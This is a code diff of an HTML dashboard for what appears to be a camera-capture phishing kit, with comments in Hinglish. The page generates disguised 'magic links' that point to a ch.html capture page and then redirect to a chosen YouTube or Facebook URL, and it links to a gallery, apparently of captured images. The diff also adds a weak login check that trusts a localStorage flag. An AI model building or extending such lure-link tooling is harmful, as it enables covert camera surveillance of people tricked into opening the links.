@@ -2,51 +2,56 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Dashboard - WE ARE KING</title>
+    <title>Camera Dashboard - WE ARE KING</title>
     <style>
-        /* Loading screen style */
-        body { background: #0f172a; color: white; font-family: sans-serif; text-align: center; margin: 0; }
-        #loadingOverlay { 
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
-            background: #0f172a; display: flex; align-items: center; justify-content: center; z-index: 999;
+        /* Shuru mein sab hide rahega */
+        body { 
+            background: #0f172a; 
+            color: white; 
+            font-family: 'Poppins', sans-serif; 
+            margin: 0; 
+            display: flex; 
+            align-items: center; 
+            justify-content: center; 
+            height: 100vh;
         }
-        #mainContent { display: none; padding: 50px; }
-        .box { background: #1e293b; padding: 30px; border-radius: 15px; border: 1px solid #00d2ff; display: inline-block; }
-        input { padding: 12px; width: 280px; background: #0f172a; color: #00d2ff; border: 1px solid #334155; }
+        #loading-screen { text-align: center; }
+        #main-app { display: none; width: 100%; max-width: 500px; text-align: center; padding: 20px; }
+        .box { background: #1e293b; padding: 30px; border-radius: 15px; border: 1px solid #00d2ff; }
+        input { width: 80%; padding: 12px; margin: 10px 0; background: #050505; color: #00d2ff; border: 1px solid #333; border-radius: 8px; }
+        button { padding: 12px 25px; background: #00d2ff; border: none; font-weight: bold; cursor: pointer; border-radius: 8px; }
     </style>
 </head>
 <body>
 
-    <!-- Jab tak login check ho raha hai, ye nazar aayega -->
-    <div id="loadingOverlay">
-        <div>
-            <h2 style="color: #00d2ff;">Checking King's Access...</h2>
-            <p>Please wait a moment.</p>
-        </div>
+    <!-- Jab tak Firebase check kar raha hai ye dikhega -->
+    <div id="loading-screen">
+        <h2 style="color: #00d2ff;">Verifying King's Access...</h2>
+        <p>Checking Security Protocol 2026</p>
     </div>
 
-    <!-- Login confirm hone ke baad ye nazar aayega -->
-    <div id="mainContent">
+    <!-- Login ke baad ye dikhega -->
+    <div id="main-app">
         <div class="box">
-            <h2 style="color: #00d2ff;">KING CAMERA GENERATOR</h2>
-            <input type="text" id="targetUrl" placeholder="Enter Target Link (e.g. YouTube)">
-            <br><br>
-            <button onclick="generateLink()" style="padding: 12px 20px; background: #00d2ff; border: none; font-weight: bold; cursor: pointer;">GENERATE LINK</button>
+            <h2>CAMERA LINK GENERATOR</h2>
+            <input type="text" id="targetUrl" placeholder="Enter Target Link (YouTube/FB)">
+            <br>
+            <button onclick="generateLink()">GENERATE MAGIC LINK</button>
             
-            <div id="result" style="margin-top: 20px; display: none; border: 1px dashed #00d2ff; padding: 10px;">
-                <p id="finalLink" style="color: #00d2ff; word-break: break-all;"></p>
-                <button onclick="copyBtn()">COPY</button>
+            <div id="resultBox" style="margin-top: 20px; display: none; border: 1px dashed #00d2ff; padding: 10px;">
+                <p id="finalLink" style="color: #00d2ff; word-break: break-all; font-size: 13px;"></p>
+                <button onclick="copyLink()" style="font-size: 10px; background: #333; color: white;">COPY LINK</button>
             </div>
         </div>
-        <br><br>
-        <a href="gallery.html" style="color: #22c55e; font-weight: bold;">[ OPEN GALLERY ]</a>
+        <br>
+        <a href="gallery.html" style="color: #00d2ff; text-decoration: none;">[ OPEN GALLERY ]</a>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
 
-        // 1. MAIN WEBSITE CONFIG (Isay DEFAULT rakha hai taake login session mil jaye)
+        // --- MAIN WEBSITE CONFIG (Login Check karne ke liye) ---
         const mainSiteConfig = {
             apiKey: "AIzaSyC9z_N93wf9RFzEYZEIlXE8yiCcnJuWC4A",
             authDomain: "cybertoolkit-65b65.firebaseapp.com",
@@ -55,33 +60,36 @@
             appId: "1:412853505695:web:050010f944695ddff41caa"
         };
 
-        // Initialize Default App for Authentication
+        // Initialize Firebase
         const app = initializeApp(mainSiteConfig);
         const auth = getAuth(app);
 
-        // Auth Observer: Wait for session restoration
+        // --- AUTH OBSERVER (Sahi tareeka redirect rokne ka) ---
         onAuthStateChanged(auth, (user) => {
-            if (user) {
-                console.log("Success: King logged in!");
-                document.getElementById('loadingOverlay').style.display = 'none';
-                document.getElementById('mainContent').style.display = 'block';
+            if (user || localStorage.getItem("isLoggedIn") === "true") {
+                // Agar login hai toh content dikhao
+                document.getElementById("loading-screen").style.display = "none";
+                document.getElementById("main-app").style.display = "block";
             } else {
-                console.warn("No session found. Redirecting...");
+                // Agar waqai login nahi hai, tabhi redirect karo
+                console.log("No session. Redirecting to login...");
                 window.location.href = "index.html";
             }
         });
 
         window.generateLink = function() {
             const redirect = document.getElementById('targetUrl').value || 'https://youtube.com';
-            const link = `${window.location.origin}/ch.html?redirect=${encodeURIComponent(redirect)}`;
-            document.getElementById('finalLink').innerText = link;
-            document.getElementById('result').style.display = 'block';
-        }
+            const domain = window.location.origin;
+            const finalUrl = `${domain}/ch.html?redirect=${encodeURIComponent(redirect)}`;
+            
+            document.getElementById('finalLink').innerText = finalUrl;
+            document.getElementById('resultBox').style.display = 'block';
+        };
 
-        window.copyBtn = function() {
+        window.copyLink = function() {
             navigator.clipboard.writeText(document.getElementById('finalLink').innerText);
-            alert("Copied!");
-        }
+            alert("Link Copied!");
+        };
     </script>
 </body>
 </html>
